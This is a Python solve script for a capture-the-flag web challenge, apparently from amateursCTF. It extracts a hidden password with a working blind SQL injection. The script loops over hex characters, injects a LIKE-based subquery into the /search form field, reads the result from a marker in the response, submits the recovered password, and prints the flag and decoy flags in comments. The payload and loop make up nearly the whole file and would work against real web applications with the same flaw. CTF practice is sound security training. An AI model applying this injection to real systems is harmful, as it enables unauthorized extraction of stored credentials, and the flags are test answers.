import requests 

url = "http://one-shot.amt.rs"

s = requests.Session() 

chars = "1234567890abcdef"
pw = ""
for i in range(32):
    for c in chars: 
        r = s.post(f"{url}/new_session") 
        id = r.text[r.text.find("id")+24:r.text.find("id")+40]
        qry = f"' AND (SELECT password FROM table_2f78e058112a0008 WHERE password LIKE '{pw + c}%') AND password LIKE '%"
        print(qry)
        r = s.post(f"{url}/search", 
                    data={
                        "id": f"{id}",
                        "query": qry
                    })
        if "*" in r.text:
            pw += c
            print(pw)

# FLAG 
url = "http://one-shot.amt.rs"
r = requests.post(f"{url}/guess", 
                  data={
                      "id":"2f78e058112a0008",
                      "password": pw
                  })
print(r.text)
# <p>amateursCTF{go_union_select_a_life}</p>
# <br />
# <h3>alternative flags (these won't work) (also do not share):</h3>
# <p>
# amateursCTF{UNION_SELECT_life_FROM_grass} <br />
# amateursCTF{why_are_you_endorsing_unions_big_corporations_are_better} <br />
# amateursCTF{union_more_like_onion_*cronch*}  <br />
# amateursCTF{who_is_this_Niko_everyone_is_talking_about}
# </p>
